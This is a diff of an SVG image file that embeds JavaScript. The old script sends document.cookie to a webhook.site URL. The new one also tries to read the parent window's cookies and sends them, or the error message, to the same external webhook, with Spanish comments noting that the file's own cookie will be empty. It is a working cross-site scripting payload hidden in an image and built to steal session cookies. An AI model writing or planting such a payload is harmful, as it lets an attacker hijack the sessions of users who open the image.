@@ -1,5 +1,16 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <script type="text/javascript">
-    fetch('https://webhook.site/1bc228d0-ba61-4060-844b-9f8561ceb40e?c='+document.cookie);
-  </script>
+<script type="text/javascript">
+  var WEBHOOK = 'https://webhook.site/1bc228d0-ba61-4060-844b-9f8561ceb40e';
+  
+  // Intentar acceder al parent
+  try {
+    var parentCookie = window.parent.document.cookie;
+    fetch(WEBHOOK + '?parent_cookie=' + encodeURIComponent(parentCookie));
+  } catch(e) {
+    fetch(WEBHOOK + '?parent_error=' + encodeURIComponent(e.message));
+  }
+  
+  // Cookie propio (va a ser vacío)
+  fetch(WEBHOOK + '?own_cookie=' + encodeURIComponent(document.cookie));
+</script>
 </svg>
